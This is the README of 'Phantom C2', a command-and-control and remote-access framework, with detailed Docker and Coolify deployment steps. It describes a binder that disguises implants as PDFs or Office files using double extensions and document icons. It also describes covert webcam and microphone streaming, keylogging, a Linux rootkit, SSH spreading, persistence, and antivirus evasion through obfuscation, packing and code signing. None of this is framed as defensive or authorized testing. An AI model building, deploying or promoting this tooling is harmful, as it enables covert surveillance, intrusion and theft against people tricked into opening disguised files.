# Phantom C2

A self-hosted command-and-control framework: encrypted beacon, dashboard, cross
compiled implants, **file binder** with document icons, live camera and live
microphone streaming, keylogging, SOCKS pivoting and a Linux kernel rootkit.

Runs as a single Docker container and deploys cleanly on Coolify.

---

## What it does

| Area | Feature |
| --- | --- |
| Transport | AES-256-GCM sealed beacons over HTTPS, sleep + jitter, fallback C2 URL |
| Stealth | `-H windowsgui` (no console window), hidden child processes, `FreeConsole`, `-trimpath`, randomised user agent, start delay, optional `garble` / `upx` |
| Binder | Wraps **any** file (PDF, DOCX, XLSX, ZIP, JPG, EXE …) into one executable that opens the decoy with the default handler and runs the implant behind it, with the matching document icon |
| Surveillance | Live camera MJPEG stream, live microphone PCM stream to the browser, screenshots, one-shot webcam/mic capture, keylogger |
| Control | Shell, file browser, upload/download, process list, persistence (systemd / Run key / cron), rootkit modules, network scan, SSH spread, SOCKS5 pivot |
| Ops | Multi-target broadcast, per-target sleep/jitter, notes and tags, session export |

---

## Coolify deployment

One click, one optional env var. Coolify renders the whole settings form for
you: `docker-compose.yml` declares every knob with a working default, so the
**Environment Variables** tab comes pre-filled and you only change what you
want. Nothing has to be set — credentials, PSK and callback URL are handled
automatically.

1. **Add the repo**: Project → Environment → **+ New** → *Public Repository* →
   paste the repo URL → **Check Repository** → *Build Pack* **Docker Compose**
   (or **Dockerfile** with Base Directory `/` and Dockerfile Location
   `/Dockerfile`; never leave it on Nixpacks) → **Save**.
2. **Environment Variables** (optional): the tab already lists all settings with
   defaults. Fill only what you want, e.g. `PHANTOM_AUTH=admin:MyStrongPass`.
   To set everything at once, paste the contents of [`.env.example`](.env.example)
   into the *Developer view* box and edit it there.
3. **Set the domain**: `https://your.domain` — **no port suffix**, the container
   listens on 80, which is the proxy default. Leave *Ports Exposes* at `80`.
4. **Deploy**, then open **Runtime Logs** and copy the generated login:

   ```
   [*] dashboard login (generated, persisted in /data/auth): admin:Xk3pQ9...
   ```

Log in with that and you're done. Everything else is automatic:

| Setting | Default behaviour | Env var |
| --- | --- | --- |
| Dashboard login | Random `admin:<20 chars>` on first boot, persisted in `/data/auth`, printed in the logs | `PHANTOM_AUTH=user:pass` |
| PSK | Random 32-byte key persisted in `/data/psk` | `PHANTOM_PSK` (64 hex chars) |
| Callback URL | Derived per request from `X-Forwarded-Host`, so payloads always point at your domain | `PHANTOM_PUBLIC_URL` |
| Volume | Named volume mounted at `/data` (fixed target), holds auth, PSK, builds and blobs | `PHANTOM_DATA` |
| Health check | `HEALTHCHECK` on `/healthz`; path is public, no credentials needed | `PHANTOM_PORT` |

### All settings

Every variable below is optional and already pre-filled by Coolify. Full
template: [`.env.example`](.env.example).

| Variable | Default | Meaning |
| --- | --- | --- |
| `PHANTOM_AUTH` | *(generated)* | Dashboard `user:password`; empty generates one |
| `PHANTOM_PSK` | *(generated)* | Beacon key, 64 hex chars (`openssl rand -hex 32`) |
| `PHANTOM_DEFAULT_PSK` | `false` | `true` reuses the shipped dev key instead of a random one |
| `PHANTOM_PUBLIC_URL` | *(auto)* | Pin the callback URL instead of deriving it from the request |
| `PHANTOM_HOST` | `0.0.0.0` | Listen address, must stay `0.0.0.0` behind the proxy |
| `PHANTOM_PORT` | `80` | Listen port, keep it in sync with *Ports Exposes* |
| `PHANTOM_TLS` | `false` | Keep off — the proxy terminates TLS |
| `PHANTOM_LOG` | `info` | Uvicorn log level |
| `PHANTOM_SEED` | `0` | `>0` seeds that many synthetic hosts for a first look |
| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume (`PHANTOM_DATA` must stay `/data`, the compose volume target is static) |
| `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts |
| `PHANTOM_ENCRYPT` / `PHANTOM_METADATA` | `true` | Seal the embedded implant / apply metadata + icon |
| `PHANTOM_GARBLE` / `PHANTOM_UPX` | `false` | Obfuscation / compression, requires `INSTALL_GARBLE=1` / `INSTALL_UPX=1` build arg |
| `PHANTOM_SIGN_PFX` / `PHANTOM_SIGN_PASS` | *(empty)* | Authenticode-sign every artifact |
| `PHANTOM_SOCKS`, `PHANTOM_SOCKS_HOST`, `PHANTOM_SOCKS_PORT` | `true`, `127.0.0.1`, `1080` | SOCKS pivot listener |
| `PHANTOM_CERT` / `PHANTOM_KEY` | `/app/server/certs/server.{crt,key}` | Only used when `PHANTOM_TLS=true` (repo ships a self-signed dev pair) |

The container compiles payloads on demand: keep the `/data` volume (without it a
redeploy rotates the PSK and breaks every bot built before) and give it ~1.5 GB RAM.

### Driving the deploy through MCP

Coolify runs an MCP server, so an agent can create, configure and deploy this
resource without the UI: `http://76.13.223.28:8000/mcp` (Streamable HTTP,
bearer token). Create a token in Coolify → **Keys & Tokens** → *API tokens*.

Any MCP client can be pointed at it:

```json
{
  "mcpServers": {
    "coolify": {
      "type": "http",
      "url": "http://76.13.223.28:8000/mcp",
      "headers": { "Authorization": "Bearer <token>" }
    }
  }
}
```

Or use the bundled helper, no client needed:

```sh
export COOLIFY_TOKEN="<token>"
./tools/coolify-mcp.ps1 -ListTools                     # see what the server offers
./tools/coolify-mcp.ps1 -Call list_applications -Arguments '{"page":1}'
./tools/coolify-mcp.ps1 -Call deploy -ArgumentsFile deploy.json
```

The tool set is **read-only plus `deploy` / `control` / `cancel_deployment`**.
Creating a resource or changing settings (FQDN, *Ports Exposes*, env vars) is
not exposed by MCP — that needs the REST API (`/api/v1`) with a token that has
`read` + `write` + `deploy` abilities. An MCP-scoped token authenticates but
answers `403` there, so keep both kinds of token separate.

Deploying a healthy app whose domain is still unset looks like this (steps 2–4
via REST):

```sh
APP=uwkoh6ttkcrxdwasfznsyfrj
curl -X PATCH "$COOLIFY/api/v1/applications/$APP" -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d "{\"fqdn\":\"http://$APP.76.13.223.28.sslip.io\",\"ports_exposes\":\"80\"}"
curl "$COOLIFY/api/v1/deploy?uuid=$APP&force=1" -H "Authorization: Bearer $TOKEN"
```

Two instance-level traps hit during the first real deploy:

* **`/api/v1` is IP-allowlisted** (`Settings → Advanced → Allowed IPs`). With a
  list set, a foreign IP gets `403 {"message":"You are not allowed to access the
  API."}` while `/mcp` keeps working, which looks like a broken token. Add the
  caller's IP, or put `0.0.0.0` in the field to allow all.
* **Compose applications take their domain from `docker_compose_domains`, not
  `fqdn`** — the API rejects `domains` for `dockercompose` and refuses
  `docker_compose_domains` until the compose file has been loaded from git. The
  working payload maps the service name to the URL:

  ```json
  {"ports_exposes":"80",
   "docker_compose_domains":[{"name":"phantom","domain":"http://<uuid>.76.13.223.28.sslip.io"}]}
  ```

  Coolify then materialises every `PHANTOM_*` variable from `docker-compose.yml`
  into the app's environment (visible in the UI, defaults pre-filled) and
  injects them as build args, which is why a redeploy is required afterwards.

The endpoint is plain `http` on port 8000, so the token crosses the wire
unencrypted — fine on a trusted network, otherwise put Coolify behind TLS.

### Redeploying after a change

`tools/coolify-deploy.ps1` wraps the two REST calls (domain/port fix-up and
deploy) and then polls `/healthz` until the new build answers:

```sh
export COOLIFY_TOKEN="<token with read+write+deploy>"
./tools/coolify-deploy.ps1 -App uwkoh6ttkcrxdwasfznsyfrj -ComposeService phantom \
  -Fqdn https://botnt.becxus.cloud
```

The deploy call is a `POST` — Coolify answers `405` for `GET`. Compose apps keep
their domain in `docker_compose_domains` (the `fqdn` field is rejected for them),
which is what `-ComposeService` sends.

Without a token: push to the tracked branch and press **Deploy** in the Coolify
UI, or enable the GitHub webhook for the app so a push auto-deploys. Verify with
`curl -fsS <domain>/healthz` — the answer must include `uptime` and the
dashboard must serve `/login`.

### `Compose file is not safe to use ... Invalid volume target: contains forbidden character`

Coolify validates `docker-compose.yml` against its own rules *before* it loads
it, and does not interpolate variables in every field. In volume definitions a
target of `${PHANTOM_DATA:-/data}` is rejected (`$`, `{`, `}`, `:` are forbidden
there). The volume target is therefore static:

```yaml
volumes:
  - phantom-data:/data
```

Keep `PHANTOM_DATA=/data`; changing it does not move the mount, only where the
app writes inside the container. The same reasoning applies to `expose:` — it is
fixed at `80`, and the healthcheck curls `127.0.0.1:80` directly. Variables are
fine in `environment:` and `build.args:` (Coolify does not shell-escape those).

Run `./tools/coolify-validate.ps1` after touching `docker-compose.yml`: it
executes Coolify's own validator against the file and prints `OK` or the exact
error Coolify would raise.

### 502 Bad Gateway right after deploy

A 502 means the proxy is up but cannot reach the container:

1. **Runtime Logs** — the container must log
   `[*] phantom entrypoint: listening target 0.0.0.0:80` and
   `Uvicorn running on http://0.0.0.0:80`. A `[!]` line names the misconfiguration.
2. **Ports Exposes** must be `80`; a `:8000` left over in the domain also works, but
   only if the container really listens on 8000.
3. **Compose "Raw" mode** — Coolify adds no proxy labels/network; use the normal mode.
4. **`PHANTOM_HOST=127.0.0.1`** → 502, use `0.0.0.0` (default).
5. **`PHANTOM_TLS=true`** behind the proxy → 502.
6. Sanity check on the server:
   `docker exec -it <container> curl -fsS http://127.0.0.1:80/healthz`
   → must return `{"ok":true,...}`.

### Deployment fails before the build: `mkdir: can't create directory .../Dockerfile`

```
[CMD]: docker exec ... mkdir -p /artifacts/<id>/Dockerfile
mkdir: can't create directory '/artifacts/<id>/Dockerfile': File exists
```

Coolify concatenates `Base Directory` onto its work directory and runs `mkdir -p` on
that path. `mkdir -p` fails when the path is an existing **file**, so a
`Base Directory` of `/Dockerfile` breaks every deploy of this repo. Use:

| Field | Value |
| --- | --- |
| Base Directory | `/` (leave it as the default slash, *not* `/Dockerfile`) |
| Dockerfile Location | `/Dockerfile` |

### Plain Docker

```sh
docker build -t phantom .
docker run -d --name phantom -p 8000:80 -v phantom-data:/data phantom
docker logs phantom | grep 'dashboard login'     # generated credentials
```

### Compose

```sh
cp .env.example .env          # optional: works without it too
docker compose up -d --build
docker compose logs | grep 'dashboard login'
```

Uncomment the `ports:` block in `docker-compose.yml` for local access.

---

## Local (non Docker) run

```sh
./deploy.sh                 # dependencies + prime the build cache
cd server && python3 server.py
```

Then open `http://127.0.0.1:8000`. Run `python3 server/gen_certs.py` and set
`PHANTOM_TLS=true` if you need TLS on the C2 itself.

### Self-checks

```sh
# seeded instance for the UI smoke test (Playwright + Chromium required)
PHANTOM_SEED=5 PHANTOM_AUTH=admin:secret PHANTOM_SOCKS=false \
  PHANTOM_DATA=.tmp/uidata PHANTOM_BUILDS=.tmp/uidata/builds \
  python3 server/server.py &
python3 tools/uicheck.py http://127.0.0.1:8000 admin:secret .tmp/shots

python3 tools/verify.py build/invoice.pdf.exe   # footer, decoy, seal, PE magic
python3 tools/harness.py                        # repack + run a binding with debug output
pwsh ./tools/coolify-validate.ps1               # validate docker-compose.yml
```

`uicheck.py` walks every view and host pane, screenshots it and exits non-zero
on a console error, a failed request or horizontal overflow.

---

## The dashboard

The console is a dependency-free ES-module SPA served by the same process. Log in
at `/login` with the generated credentials; the session is an httpOnly cookie
(7 days when *keep me signed in* is ticked) and `?token=<password>` links still
work for scripts.

| View | What it is for |
| --- | --- |
| **Overview** | Fleet health: online/idle/stale counts, queue pressure, event sparkline, platform mix, one-click broadcasts |
| **Fleet** | Every host with derived presence, filters, sorting, tags, multi-select and a bulk command bar |
| **Host** | Per-target workspace: console, file browser, processes, keylogger, camera/mic, network scan, SOCKS, spread, persistence, rootkit, profile |
| **Payloads** | Bind a decoy or emit a raw implant, plus the artifact list |
| **Activity** | Audit trail of joins, drops, commands, files and builds |
| **Environment** | Callback URL, PSK hint, build profile, live counters, capability matrix |

Presence, queue state and stream flags are pushed over `/ws`; a host is only
"online" while its next beacon window is still open, so the UI never shows a
dead session as alive. Keyboard: `Ctrl/⌘ K` palette, `/` filter the fleet,
`g` + `o/f/p/a/e` jump, `?` shortcut sheet, `Esc` close overlays.

### Appearance

The console is dark by default. The switch at the bottom of the sidebar (also
*Environment → Appearance*, or the palette command) flips to a light theme and
picks one of five accents: amber gold, classic blue, violet, cyan or graphite.
The choice is per browser, stored in `localStorage` as `phantom-theme` /
`phantom-accent`, applied by an inline script before the first paint (no flash)
and mirrored to `<meta name="theme-color">`.

Tokens follow the Becxus theme system: graphite surfaces, hairline `#1e1e1e`
borders, a single accent reserved for brand and focus, an 18 px radius scale,
soft depth shadows, tabular numerals for all counters and transparent thin
scrollbars. Body text sits at 17–18:1 contrast in both themes.


---

## Using the builder

1. Open **Payloads**.
2. Drop the decoy file (invoice.pdf, contract.docx, photo.jpg …).
3. The callback URL is filled automatically from the request header
   (`X-Forwarded-Host` → public IP → LAN IP). Press the refresh button to reset it.
4. Choose platform/arch, sleep, jitter, optional start delay.
5. **Bind & build** → download the artifact from *Artifacts*.

The produced file is `name.pdf.exe` (double extension keeps the PDF icon while
Windows still executes it). On launch the stub:

* writes the decoy to `%LOCALAPPDATA%\<name>` and opens it with the shell
  association,
* drops the implant beside it and starts it detached — no console flash,
* the implant then beacons to the configured URL.

Linux/macOS bindings are `.run` files (`chmod +x` them); they behave the same
using `xdg-open` / `open` under `~/.cache` / `~/Library/Caches`.

Toggle **document icon** off to ship a plain `.exe`, or use **build raw implant**
for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.

---

## Operations notes

* **Live camera** and **live microphone** need `ffmpeg` on the target. Missing
  tools surface as a toast with the exact install hint. Devices are enumerated
  automatically (DirectShow / V4L2 / AVFoundation).
* Camera frames land in the host's **Camera & mic** pane and in its capture
  gallery; the audio stream is decoded by Web Audio at 16 kHz mono and plotted
  as a waveform. Both stop with the matching *stop* / *mute* button.
* **SOCKS pivot**: run `socks` on a bot, then point tooling at `127.0.0.1:1080`
  (SSH tunnel or published port).
* **Rootkit** (Linux) needs `phantom_rootkit.ko` built with `make -C rootkit`
  and uploaded to the target.
* Keylogging on Linux needs read access to `/dev/input/*` (root).

## Detection notes

No payload is invisible to every AV engine. What is done here:

* GUI subsystem binary, no console flash, no visible window,
* strings stripped (`-s -w`, `-trimpath`), optional `garble` identifier
  obfuscation and `upx` packing,
* realistic browser user agent, encrypted body, HTTPS with jittered timing,
* decoy first: the user sees the document they expected.

For maximum evasion add a code-signing certificate afterwards:

```sh
osslsigncode sign -certs cert.pem -key key.pem -in in.exe -out out.exe
```

---

## Layout

```
implant/            Go beacon (cross platform) + stealth + live media
server/             FastAPI C2, builder, binder stub, crypto, tool catalogue
server/static/      dashboard SPA (login, views, palette) + styles
fileless/           memfd loader template
rootkit/            Linux LKM
front/              optional nginx TLS front for a bare VPS
Dockerfile          Coolify-ready image
docker-compose.yml  Coolify service definition (every setting = env var)
.env.example        env template to paste into Coolify
tools/              local helpers (build verifier, UI smoke test, Coolify validator)
```

## API quick reference

Everything except the ingest paths, `/login` and `/healthz` needs a session
cookie, HTTP basic auth or `?token=<password>`.

| Method | Path | Purpose |
| --- | --- | --- |
| `POST` | `/api/login` / `/api/logout` | cookie session in/out (rate limited) |
| `GET` | `/api/me` | who the caller is and whether auth is on |
| `GET` | `/api/sessions`, `/api/session/{id}` | fleet snapshot / one session |
| `POST` | `/api/session/{id}/command` | queue a raw command |
| `POST` | `/api/session/{id}/tool/{tool}` | queue a catalogue tool (validated) |
| `GET` | `/api/session/{id}/timeline` | command history |
| `GET` | `/api/session/{id}/files`, `…/processes`, `…/scan` | cached tool results |
| `GET/POST` | `/api/session/{id}/keylog…` | keylog archive and start/stop/dump/clear |
| `GET` | `/api/session/{id}/cam.mjpg`, `cam.jpg`, `mic.pcm` | live media streams |
| `PATCH/DELETE` | `/api/session/{id}` | notes/tags/beacon timing, forget session |
| `POST` | `/api/broadcast` | fan out a command |
| `GET` | `/api/events`, `/api/stats`, `/api/tools` | audit trail, counters, tool catalogue |
| `POST` | `/api/bind` | multipart bind (file + options) |
| `POST` | `/api/build` | raw implant build |
| `GET/DELETE` | `/api/builds…`, `/api/blobs…` | artifact and capture management |
| `GET` | `/ws` | live operator socket |
| `POST` | `/beacon` | encrypted beacon in/out |
| `POST` | `/api/media/push`, `/api/media/upload` | camera/mic frames and captures |
| `GET` | `/healthz` | container health probe |
